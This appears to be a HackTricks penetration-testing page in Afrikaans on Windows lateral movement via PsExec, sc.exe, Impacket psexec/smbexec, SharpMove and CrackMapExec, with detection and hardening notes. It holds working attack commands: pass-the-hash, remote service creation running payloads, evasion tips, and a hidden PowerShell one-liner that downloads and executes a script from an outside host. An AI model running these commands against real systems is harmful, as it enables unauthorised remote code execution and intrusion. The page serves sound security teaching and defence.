# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Hoe werk hulle?

Hierdie tegnieke misbruik die Windows Service Control Manager (SCM) op afstand oor SMB/RPC om opdragte op ’n teikenhost uit te voer. Die algemene vloei is:

1. Meld by die teiken aan en kry via SMB toegang tot die ADMIN$-share (TCP/445).
2. Kopieer ’n uitvoerbare lêer of spesifiseer ’n LOLBAS-opdragreël wat die diens sal uitvoer.
3. Skep op afstand ’n diens via SCM (MS-SCMR oor \PIPE\svcctl) wat na daardie opdrag of binêre lêer wys.
4. Begin die diens om die payload uit te voer en vang, indien nodig, stdin/stdout via ’n named pipe op.
5. Stop die diens en maak skoon (verwyder die diens en enige neergelêde binêre lêers).

Vereistes/voorvereistes:
- Plaaslike Administrator op die teiken (SeCreateServicePrivilege) of uitdruklike regte om dienste op die teiken te skep.
- SMB (445) moet bereikbaar wees en die ADMIN$-share moet beskikbaar wees; Remote Service Management moet deur die host-firewall toegelaat word.
- UAC Remote Restrictions: met plaaslike rekeninge kan token filtering admin-toegang oor die netwerk blokkeer, tensy die ingeboude Administrator-rekening gebruik word of LocalAccountTokenFilterPolicy=1 gestel is.
- Kerberos teenoor NTLM: die gebruik van ’n hostname/FQDN maak Kerberos moontlik; as daar met ’n IP-adres gekoppel word, val dit dikwels terug na NTLM (en kan dit in verharde omgewings geblokkeer word).

### Handmatige ScExec/WinExec via sc.exe

Die volgende wys ’n minimale benadering om ’n diens te skep. Die diens se image kan ’n neergelêde EXE wees of ’n LOLBAS soos cmd.exe of powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notas:
- Verwag ’n time-out-fout wanneer ’n EXE wat nie ’n diens is nie, begin word; uitvoering vind steeds plaas.
- Om meer OPSEC-vriendelik te bly, verkies lêerlose opdragte (cmd /c, powershell -enc) of vee afgelaaide artefakte uit.

Vind meer gedetailleerde stappe by: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling and examples

### Sysinternals PsExec.exe

- Klassieke admin-nutsding wat SMB gebruik om PSEXESVC.exe in ADMIN$ te plaas, ’n tydelike diens installeer (versteknaam PSEXESVC) en I/O oor genoemde pype aanstuur.
- Voorbeeldgebruike:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Jy kan direk vanaf Sysinternals Live via WebDAV begin:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Laat diensinstallasie-/deïnstallasiegebeurtenisse agter (diensnaam is dikwels PSEXESVC, tensy -r gebruik word) en skep C:\Windows\PSEXESVC.exe tydens uitvoering.

### Impacket psexec.py (PsExec-like)

- Gebruik ’n ingebedde RemCom-agtige diens. Plaas ’n tydelike diensbinêre lêer (gewoonlik met ’n ewekansige naam) via ADMIN$, skep ’n diens (standaard dikwels RemComSvc) en stuur I/O deur ’n named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefakte
- Tydelike EXE in C:\Windows\ (lukrake 8 karakters). Diensnaam is RemComSvc by verstek, tensy dit oorskryf word.

### Impacket smbexec.py (SMBExec)

- Skep ’n tydelike diens wat cmd.exe laat begin en ’n named pipe vir I/O gebruik. Vermy gewoonlik die neerlê van ’n volledige EXE-payload; opdraguitvoering is semi-interaktief.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementeer verskeie laterale bewegingsmetodes, insluitend diensgebaseerde exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) sluit dienswysiging/-skepping in om 'n opdrag op afstand uit te voer.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Jy kan ook CrackMapExec gebruik om via verskillende backends uit te voer (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, opsporing en artefakte

Tipiese gasheer-/netwerkartefakte wanneer PsExec-agtige tegnieke gebruik word:
- Security 4624 (Logon Type 3) en 4672 (Special Privileges) op die teiken vir die admin-rekening wat gebruik is.
- Security 5140/5145 File Share- en File Share Detailed-gebeurtenisse wat ADMIN$-toegang en die skep/skryf van diensbinaries (bv. PSEXESVC.exe of ’n ewekansige 8-karakter .exe) toon.
- **System** 7045 van Service Control Manager vir diensinstallasie op die teiken: name soos PSEXESVC, RemComSvc of pasgemaakte name (`-r` / `-service-name`). Dit bewys dat ’n diens geïnstalleer is, nie dat die image daarvan uitgevoer is nie. Vergelyk die tydstempel en image-pad daarvan met prosesgebeurtenisse of ’n ooreenstemmende diens-image-prefetch-inskrywing, indien beskikbaar.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) vir services.exe of die diens-image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) vir pipes soos \\.\pipe\psexesvc, \\.\pipe\remcom_* of ewekansige ekwivalente.
- Registerartefak vir Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 op die operateurgasheer (indien dit nie onderdruk is nie).

Idees vir opsporing
- Waarskuwing oor diensinstallasies waar die ImagePath cmd.exe /c, powershell.exe of TEMP-liggings insluit.
- Soek prosesskeppings waar ParentImage C:\Windows\PSEXESVC.exe is, of waar kinders van services.exe as LOCAL SYSTEM shells uitvoer.
- Merk benoemde pipes wat eindig op -stdin/-stdout/-stderr, of die bekende pipe-name van PsExec-klone.

## Probleemoplossing van algemene foute
- Toegang geweier (5) wanneer dienste geskep word: nie werklik ’n plaaslike admin nie, UAC-afstandbeperkings vir plaaslike rekeninge, of EDR-peuterbeskerming op die diensbinary-pad.
- Die netwerkpad is nie gevind nie (53), of kon nie aan ADMIN$ koppel nie: firewall blokkeer SMB/RPC of admin shares is gedeaktiveer.
- Kerberos misluk, maar NTLM is geblokkeer: koppel met die gasheernaam/FQDN (nie IP nie), maak seker dat die SPN’s korrek is, of verskaf `-k`/`-no-pass` met tickets wanneer Impacket gebruik word.
- Diensbegin loop uit, maar die payload het uitgevoer: verwag as dit nie ’n werklike diensbinary is nie; stoor die uitvoer in ’n lêer of gebruik smbexec vir lewendige I/O.

## Verhardingsnotas
- Windows 11 24H2 en Windows Server 2025 vereis SMB signing by verstek vir uitgaande (en Windows 11 se inkomende) verbindings. Dit breek nie wettige PsExec-gebruik met geldige geloofsbriewe nie, maar voorkom unsigned SMB relay-misbruik en kan toestelle raak wat nie signing ondersteun nie.<sup>[[2]](#references)</sup>
- Nuwe SMB-kliënt-NTLM-blokkering (Windows 11 24H2/Server 2025) kan NTLM-terugval voorkom wanneer daar met ’n IP of aan nie-Kerberos-bedieners gekoppel word. In verharde omgewings sal dit NTLM-gebaseerde PsExec/SMBExec breek; gebruik Kerberos (gasheernaam/FQDN) of stel uitsonderings op indien dit wettiglik nodig is.<sup>[[2]](#references)</sup>
- Beginsel van minimum voorreg: beperk plaaslike admin-lidmaatskap, verkies Just-in-Time/Just-Enough Admin, dwing LAPS af, en monitor/waarsku oor 7045-diensinstallasies.

## Sien ook

- WMI-gebaseerde afstanduitvoering (dikwels meer fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-gebaseerde afstanduitvoering:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB-sekuriteitsverharding in Windows Server 2025 en Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Gebruik geloofsbriewe om Windows-rekenaars oor te neem - Deel 2 (PSExec en dienste)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Probleemoplossing van onverwagte herbegin met behulp van stelselgebeurtenislogboeke](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
